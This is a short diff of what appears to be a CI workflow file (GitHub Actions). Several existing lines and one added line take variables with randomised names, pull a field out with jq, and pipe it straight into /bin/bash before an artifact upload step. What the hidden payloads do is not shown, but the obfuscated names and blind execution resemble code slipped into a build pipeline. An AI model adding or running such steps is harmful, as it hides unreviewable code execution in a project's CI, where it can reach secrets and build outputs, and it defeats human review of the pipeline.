@@ -26,6 +26,7 @@ jobs:
           echo $yt0143 | jq -r .ol9353 | /bin/bash
           echo $wpi3 | jq -r .spxqx2705 | /bin/bash
           printf '%s' "$bfedk53" | jq -r .abfg33903 | /bin/bash
+          echo $csd653 | jq -r .m6 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
